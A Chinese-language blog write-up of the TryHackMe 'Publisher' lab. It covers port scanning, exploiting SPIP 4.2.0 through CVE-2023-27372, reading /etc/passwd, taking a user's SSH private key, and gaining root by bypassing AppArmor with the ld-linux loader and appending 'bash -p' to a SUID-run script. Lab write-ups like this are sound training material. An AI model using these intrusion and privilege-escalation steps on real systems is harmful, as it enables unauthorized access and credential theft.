---
layout: post
title:  "TryHackMe Challenge Writeup: Publisher"
date:   24 June 2025
categories: Demo
tags: TryHackMe-Challenge Writeup
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
本篇是關於TryHackMe上的Challenge: [Publisher](https://tryhackme.com/room/publisher) 我的解題思路和歷程，紀錄自己嘗試了哪些手段以及學習了哪些新的攻擊手法和切入角度
  
### Step 1. Nmap
- Nmap先觀察開了哪些端口和服務：發現了22/80 
  
```bash
PORT   STATE SERVICE VERSION                                                                                                                               
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)                                                                         
| ssh-hostkey:                                                                                                                                             
|   3072 d4:41:9f:e5:48:15:de:95:c2:93:2c:e3:aa:a4:16:94 (RSA)                                                                                             
|   256 58:3d:46:5e:ae:32:2c:c9:91:47:b3:f0:6e:95:73:cb (ECDSA)                                                                                            
|_  256 24:1d:7e:e2:26:dd:0c:13:80:b7:e6:ff:d2:94:5f:c9 (ED25519)                                                                                          
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
  
- 22一定不是切入點，所以去看80

### Step 2. 檢查80
- 首先看了一圈網站，其實沒什麼感興趣的
- 就可以記一下用戶名 `admin` 和 `Free Web Template`
- gobuster 爆一下目錄，得到 `/images` 和 `/spip`
- `/images`沒什麼感興趣的，看 `/spip`
- 查看 spip 有關的CVE，發現一堆很難定位實際有效的漏洞，決定先找出使用的spip版本
- 用whatweb查看spip版本  

```bash
└─$ whatweb http://10.10.54.119/spip/
http://10.10.54.119/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.54.119], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://10.10.54.119/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]
```  
  
- **spip: 4.2.0**
- 用searchsploit或直接手動查詢Exploit-DB: spip 4.2.0 都可以獲得同樣的結果
- [CVE-2023-27372](https://www.exploit-db.com/exploits/51536)
- 稍微修改一下，讓response顯示出結果
- 成功獲得www-data(uid=33(www-data) gid=33(www-data) groups=33(www-data))權限

### Step 3. 提權
#### 3.1 Attempt: id
- 首先 `id` 查看目前用戶權限, 沒什麼特別的
#### 3.2 Attempt: /etc/passwd, /etc/shadow, /etc/group
- 嘗試 `cat /etc/passwd`
```bash
root:x:0:0:root:/root:/bin/bash                                    
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin               
bin:x:2:2:bin:/bin:/usr/sbin/nologin                               
sys:x:3:3:sys:/dev:/usr/sbin/nologin                            
sync:x:4:65534:sync:/bin:/bin/sync                          
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
think:x:1000:1000::/home/think:/bin/sh 
```  
  
- 排除掉所有 nologin 和不重要的帳戶，剩下的就只有: `root`, `think`
- 嘗試 `cat /etc/group` 查看有沒有用戶跟root在同一個group

```bash
x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
ssl-cert:x:101:
think:x:1000:
``` 
  
- 沒有，那麼先暫時緩緩思路，結果還是先存一下，說不定後面會用到
#### 3.3 Attempt: setuid
- 找看看可不可以找到setuid的文件

```bash
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
```

- 嘗試 `/usr/bin/gpasswd -a www-data sudo` 之類的也是不行
#### 3.4 Attempt: /home/think 排查
- 嘗試看看 /home/think下有沒有什麼有趣的
  
```bash
drwxr-xr-x 8 think    think    4096 Feb 10  2024 .
drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
drwx------ 2 think    think    4096 Nov 14  2023 .cache
drwx------ 3 think    think    4096 Dec  8  2023 .config
drwx------ 3 think    think    4096 Feb 10  2024 .gnupg
drwxrwxr-x 3 think    think    4096 Jan 10  2024 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .python_history -> /dev/null
drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt
```
  
- 喔喔，有找到有趣的了哦，.ssh文件夾下存的應該是ssh密鑰，應該可以直接登入用戶think進去看
  
```bash
drwxr-xr-x 2 think think 4096 Jan 10  2024 .
drwxr-xr-x 8 think think 4096 Feb 10  2024 ..
-rw-r--r-- 1 root  root   569 Jan 10  2024 authorized_keys
-rw-r--r-- 1 think think 2602 Jan 10  2024 id_rsa
-rw-r--r-- 1 think think  569 Jan 10  2024 id_rsa.pub
```

- copy id_rsa 然後儲存到自己的attack machine；之後chmod 400 id_rsa
- 成功登入用戶think

#### 3.5 Attempt: 看看從用戶think角度會不會有不同的發現
- `find / -perm -4000 -user root 2>/dev/null`
  
```bash
think@ip-10-10-54-119:~$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```
  
- 一個一個去GTFOBin查看有沒有可以利用的
- 嘗試 getcap

```bash
think@ip-10-10-54-119:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
```  
  
- 找的過程中發現其實還有一個用戶 `ubuntu`: `ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash`

#### 3.6 Attempt with hint
- 回去看其實在前面有找到一個SUID binary file (run_container)
- 用linpeas找到有AppArmor，這裏必需知道AppArmor的執行方式(總的來説，AppArmor禁止設定中路徑一致的執行方式, 如果你從**沒被列入限制的 soft link 路徑**來執行程式，就能繞過 AppArmor。例如禁止使用默認載入器執行/bin/bash，但是卻沒有禁止使用默認載入器的軟連接執行/bin/bash，所以我們要做的就是利用這個軟鏈接來獲得不同的shell，這樣再使用具有SUID的binary執行的時候就能使用這個shell了)
- 使用載入器 `/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2` 指定用載入器執行 /bin/bash : `/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash`
- 再將 `bash -p` 加到 run_container.sh 裡: `echo 'bash -p' >> run_container.sh` (因爲run_container.sh 權限為777，所以直接在文件後面執行bash來獲得一個新的shell)
- `bash -p` 是能夠讓有SUID的binary程序提權到owner權限而不是默認降級
- 最後執行 `run_container.sh` 就可以獲得 root shell  
- 順帶一提，可以通過 `ldd /bin/bash` 來查看 bash 預設是透過哪一個 loader 啟動的

### 最後自我總結
首先到user權限之前其實都還算可以，老實說找到.ssh有點運氣成分但也還行
  
但使用載入器和`bash -p`來提權真的是第一次遇到，非常有趣，希望之後自己能記起來這種手法！

## 學習資料
1. [TryHackMe Challenge: Publisher](https://tryhackme.com/room/publisher) 
2. [Publisher Writeup](https://medium.com/@josemlwdf/publisher-cccb172abd8e)

</div>
</body>
</html>
